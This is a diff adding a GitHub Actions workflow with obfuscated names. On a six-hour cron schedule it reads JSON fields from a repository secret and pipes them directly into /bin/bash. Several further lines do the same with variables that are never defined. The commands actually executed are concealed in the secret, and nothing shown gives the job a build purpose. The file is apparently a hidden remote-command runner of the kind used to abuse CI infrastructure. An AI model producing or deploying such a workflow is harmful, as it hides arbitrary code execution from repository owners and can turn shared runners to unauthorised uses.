@@ -1,0 +1,25 @@
+name: jiadaosi9810
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiadaosi9810
+        env:
+          zi147: ${{ secrets.zi147 }}
+        run: |
+          echo $zi147 | jq -r .p762 | /bin/bash
+          echo $tkbgy650 | jq -r .uc7 | /bin/bash
+          echo $om2595 | jq -r .nq4005 | /bin/bash
+          echo $nj722 | jq -r .p1 | /bin/bash
+          echo $nrqx06260 | jq -r .n760 | /bin/bash
+          echo $cvov789 | jq -r .vlu8 | /bin/bash
+          echo $wxwlf0 | jq -r .b14855 | /bin/bash
+
